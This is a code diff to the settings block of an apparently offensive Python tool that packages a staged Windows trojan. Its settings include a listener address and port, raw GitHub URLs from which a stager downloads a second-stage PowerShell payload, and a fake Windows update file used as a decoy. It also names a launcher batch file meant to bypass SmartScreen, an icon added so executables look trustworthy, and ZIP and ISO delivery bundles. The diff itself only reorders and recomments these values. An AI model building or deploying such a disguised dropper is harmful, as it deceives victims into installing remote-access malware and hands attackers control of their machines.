@@ -52,24 +52,29 @@ except ImportError:
 # IP and port on which the listener is listening
 LHOST        = "192.168.1.139"
 LPORT        = "21"
-# Host from which you download second.TXT, stager.TXT
+
+# Host from which stager (STAGERNAME) download second stage (SECONDNAME)
 ATTACKER_URL = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
-# Host from which you download trojan.ISO
+
+# Host from which you download second stage (SECONDNAME) and front end file (e.g. windows update - TROJAN-FE)
 TROJAN_URL   = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
+
 # File name
 SECONDNAME   = "second.txt"              # second stage (PS1)
 STAGERNAME   = "stager.txt"              # stager (PS1) that calls the second stage via the web
 TROJANNAME   = "installer.ps1"           # trojan (PS1) that calls the stager that calls the second stage via the web + if all goes well, calls the FE file
+TROJAN_FE    = "update_k897867.msu"      # windows update to use as the Trojan's FE (other files are fine)
 LAUNCHERNAME = "launcher.bat"            # launcher (file trusted by Windows) that calls any .exe file to bypass SmartScreen
+
 EXENAME      = "'ps2pdf'.exe"            # name of the .exe file to be called by the launcher
 ICONNAME     = "sicurezza.ico"           # icon to inject into executables to make them appear more trustworthy
 EXESECONDNAME= "second.exe"              # name to give to the compiled second stage (EXE)
 EXESTAGER    = "stager.exe"              # name to give to the compiled stager (EXE)
 TROJANEXE    = "trojan.exe"              # name to give to the Trojan (EXE) compiled
+
 ZIPSECONDNAME= "01.LAUNCHER-SECOND.zip"  # contains launcher + secondStage.exe
 ZIPNAME      = "02.LAUNCHER-STAGER.zip"  # contains launcher + stager.exe (which calls secondStage via the web)
 ISONAME      = "03.LAUCHER-TROJAN.iso"   # contains launcher + trojan (which calls stager, which calls secondStage via the web + if all goes well, also calls the FE file)
-TROJAN_FE    = "update_k897867.msu"      # indows update to use as the Trojan's FE (other files are fine)
 
 # IP, User and Pass to connect to in order to perform the ISO to EXE conversion operation
 WIN_IP       = "192.168.1.111"
